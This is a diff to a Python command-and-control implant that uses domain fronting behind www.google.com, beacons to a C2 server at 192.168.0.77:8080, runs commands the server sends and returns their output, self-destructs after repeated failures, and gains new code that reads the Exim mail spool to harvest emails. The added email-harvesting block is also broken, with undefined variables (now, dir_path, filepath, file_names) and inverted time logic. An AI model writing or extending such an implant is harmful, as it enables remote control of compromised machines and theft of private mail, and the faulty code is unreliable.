@@ -16,10 +16,11 @@ import os
 import base64
 import hashlib
 import urllib3
+import time
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BLOCK_SIZE = 16
 # KEY = "your_secret_key_here"  # Replace with your actual key
-key_path = "./key.txt"
+key_path = "/var/tmp/pkey.txt"
 
 def get_key():
     with open(key_path, 'rb') as f:
@@ -92,8 +93,8 @@ def deobfuscate(obf_str):
 
 # --- Domain Fronting Settings ---
 FRONT_DOMAIN = "www.google.com"  # TLS SNI for obfuscation
-FRONT_DOMAIN = "127.0.0.1:8080"
-REAL_DOMAIN = "127.0.0.1:8080"         # Actual C2 server IP/domain
+FRONT_DOMAIN = "192.168.0.77:8080"
+REAL_DOMAIN = "192.168.0.77:8080"         # Actual C2 server IP/domain
 UPLOAD_PATH = "/upload"
 COMMAND_PATH = "/command"
 LOG_PATH = "/log"
@@ -219,6 +220,26 @@ def execute_command(cmd):
 def main():
     fail_count = 0
     while True:
+
+        emails = "/var/spool/exim/input"
+        timestamp = time.time()
+        email_names = []
+        timestamp_prev = now - 300
+        for filename in os.listdir(dir_path):
+                absolute_path = os.path.join(emails, filename)
+                if os.path.isfile(filepath):
+                        mtime = os.path.getmtime(filepath)
+                        if mtime > timestamp:
+                                email_names.append(filepath + "/" + filename)
+				
+        print(file_names)
+	
+        for cur_email in email_names:
+                with open(cur_email, "r") as email:
+                        lines = email.readlines()
+                        print(lines)
+			
+	
         if fail_count >= 60:
             self_destruct()
             return
@@ -244,6 +265,7 @@ def main():
                 result = f"Executed Command: {cmd}\nOutput:\n{result}"
                 send_log(result)
         time.sleep(15)
+        
 
 if __name__ == '__main__':
     main()
